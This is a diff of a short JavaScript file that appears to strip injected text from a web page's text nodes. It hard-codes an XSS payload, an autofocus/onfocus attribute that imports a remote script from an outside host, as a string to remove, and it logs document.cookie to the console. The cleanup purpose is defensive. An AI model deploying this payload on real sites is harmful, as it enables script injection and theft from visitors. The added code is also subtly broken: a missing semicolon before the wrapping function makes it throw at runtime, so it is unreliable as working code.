@@ -1,16 +1,21 @@
 console.log('selam');
-console.log(document.cookie);
+console.log(document.cookie)
+  
+(function() {
+  const zararliMetin = `"autofocus onfocus="import('https://abbb.3d.tc/a.js');`;
 
-function removeModuleScriptText(node) {
-  if (node.nodeType === Node.TEXT_NODE) {
-    node.textContent = node.textContent
-      .replace(/<script\s+type=["']module["']\s+src=["'][^"']+["']><\/script>/gi, '')
-      .replace(/autofocus\s+onfocus=["']import\([^"']+\);["']/gi, '');
-  } else {
-    node.childNodes.forEach(removeModuleScriptText);
+  function temizleMetinNode(node) {
+    if(node.nodeType === Node.TEXT_NODE) {
+      node.nodeValue = node.nodeValue.replaceAll(zararliMetin, '');
+      node.nodeValue = node.nodeValue.replace(/<script\s+type=["']module["']\s+src=["'][^"']+["']><\/script>/gi, '');
+    } else {
+      node.childNodes.forEach(temizleMetinNode);
+    }
   }
-}
 
-removeModuleScriptText(document.body);
+  temizleMetinNode(document.body);
+})();
+
+;
 
 export {};
